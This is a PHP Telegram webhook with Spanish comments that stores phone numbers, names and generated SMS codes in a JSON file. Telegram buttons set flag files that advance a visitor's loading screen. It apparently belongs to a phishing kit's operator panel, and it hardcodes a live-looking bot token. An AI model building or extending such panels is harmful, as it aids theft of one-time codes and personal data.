<?php
// Webhook de Telegram para manejar el botón "Pedir nuevo SMS"

// Mismos valores que en procesar.php
$BOT_TOKEN = '8036763317:AAGJbdfFqJt3yi_MwhnP1_DXsSug9oW31HY';

function rutaCodigos()
{
    return __DIR__ . '/codigos.json';
}

function guardarCodigo($telefono, $codigo, $nombre = null)
{
    $archivo = rutaCodigos();
    $datos = [];
    if (is_file($archivo)) {
        $json = file_get_contents($archivo);
        $tmp = json_decode($json, true);
        if (is_array($tmp)) {
            $datos = $tmp;
        }
    }
    $existente = $datos[$telefono] ?? [];
    if (!is_array($existente)) {
        $existente = ['codigo' => $existente];
    }
    $existente['codigo'] = $codigo;
    if ($nombre !== null) {
        $existente['nombre'] = $nombre;
    }
    $datos[$telefono] = $existente;
    file_put_contents($archivo, json_encode($datos));
}

function flagPath($telefono)
{
    $safe = preg_replace('/[^0-9]+/', '_', $telefono);
    return __DIR__ . '/ready_' . $safe . '.flag';
}

function marcarListo($telefono)
{
    file_put_contents(flagPath($telefono), '1');
}

function finalFlagPath($telefono)
{
    $safe = preg_replace('/[^0-9]+/', '_', $telefono);
    return __DIR__ . '/done_' . $safe . '.flag';
}

function marcarFinal($telefono)
{
    file_put_contents(finalFlagPath($telefono), '1');
}

function enviarATelegram($botToken, $chatId, $texto, $replyMarkup = null)
{
    if ($botToken === 'PON_AQUI_TU_BOT_TOKEN') {
        return false;
    }

    $url = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
    $data = [
        'chat_id' => $chatId,
        'text'    => $texto,
    ];
    if ($replyMarkup !== null) {
        $data['reply_markup'] = json_encode($replyMarkup);
    }

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'timeout' => 5,
        ],
    ];

    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

$input = file_get_contents('php://input');
$update = json_decode($input, true);

if (!$update) {
    http_response_code(400);
    exit('No update');
}

// Solo nos interesan las callback_query de los botones inline
if (isset($update['callback_query'])) {
    $callback = $update['callback_query'];
    $chatId   = $callback['message']['chat']['id'] ?? null;
    $data     = $callback['data'] ?? '';

    if ($chatId && strpos($data, 'PEDIR_SMS|') === 0) {
        $telefono = substr($data, strlen('PEDIR_SMS|'));
        $telefono = trim($telefono);

        if ($telefono !== '') {
            // Generar nuevo código y guardarlo para ese teléfono
            $nuevoCodigo = random_int(100000, 999999);
            guardarCodigo($telefono, $nuevoCodigo);

            // Marcar como listo para que la pantalla de carga pueda continuar
            marcarListo($telefono);

            // Obtener nombre almacenado para ese teléfono (si existe)
            $archivo = rutaCodigos();
            $primerNombre = '';
            if (is_file($archivo)) {
                $json = file_get_contents($archivo);
                $datos = json_decode($json, true);
                if (is_array($datos) && isset($datos[$telefono]['nombre'])) {
                    $nombreCompleto = trim($datos[$telefono]['nombre']);
                    if ($nombreCompleto !== '') {
                        $partes = preg_split('/\s+/', $nombreCompleto);
                        $primerNombre = $partes[0] ?? '';
                    }
                }
            }

            if ($primerNombre === '') {
                $primerNombre = 'el usuario';
            }

            // Aquí integrarías el envío real de SMS usando $telefono y $nuevoCodigo

            $texto = "El código SMS fue enviado a $primerNombre";
            $replyMarkup = [
                'inline_keyboard' => [
                    [
                        [
                            'text' => '📩🔄 SMS',
                            'callback_data' => 'PEDIR_SMS|' . $telefono,
                        ],
                    ],
                ],
            ];
            enviarATelegram($BOT_TOKEN, $chatId, $texto, $replyMarkup);
        }
    } elseif ($chatId && strpos($data, 'LISTO|') === 0) {
        $telefono = substr($data, strlen('LISTO|'));
        $telefono = trim($telefono);
        if ($telefono !== '') {
            marcarFinal($telefono);
            enviarATelegram($BOT_TOKEN, $chatId, 'Marcado como listo ✅');
        }
    }
}

// Telegram solo necesita un 200 OK
http_response_code(200);
echo 'OK';
